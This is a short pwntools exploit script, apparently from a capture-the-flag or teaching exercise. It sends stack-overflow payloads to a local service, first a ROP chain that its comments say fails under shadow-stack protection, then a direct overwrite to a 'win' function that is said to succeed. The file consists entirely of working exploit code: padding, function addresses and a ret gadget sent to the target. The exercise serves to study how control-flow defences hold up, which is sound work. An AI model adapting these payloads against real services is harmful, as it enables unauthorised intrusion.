#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

# example rop payload ~ doesn't work when shstk is enabled
RET = 0x40101a # : ret
payload = b""
payload += b"A" * 0x20
payload += p64(elf.sym["say_my_name"]) # yes, we could just make this win but...
# ...the point is to show a rop payload that actually fails when shstk is enabled
payload = payload.ljust(0x38, b"B")
payload += p64(RET)
payload += p64(elf.sym["win"])

# cop payload ~ _does_ work when shstk is enabled
payload = b""
payload += b"A" * 0x20
payload += p64(elf.sym["win"])

p.sendline(payload)

p.interactive()
